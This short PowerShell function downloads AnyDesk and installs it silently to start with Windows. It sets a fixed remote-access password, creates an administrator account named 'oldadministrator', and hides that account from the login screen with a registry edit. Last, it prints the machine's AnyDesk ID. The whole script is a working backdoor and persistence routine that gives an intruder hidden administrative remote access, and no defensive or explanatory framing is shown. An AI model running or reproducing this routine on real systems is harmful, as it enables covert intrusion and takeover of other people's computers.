Function AnyDesk {

   mkdir "C:\Program Files (x86)\AnyDesk"
   $clnt = new-object System.Net.WebClient
   $url = "http://download.anydesk.com/AnyDesk.exe"
   $file = "C:\Program Files (x86)\AnyDesk\AnyDesk.exe"
   $clnt.DownloadFile($url,$file)


   cmd.exe /c "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent


   cmd.exe /c echo P@ssw0rd123! | "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password


   net user oldadministrator "P@ssw0rd123!" /add
   net localgroup Administrators oldadministrator /ADD
   reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f

   cmd.exe /c "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --get-id

}
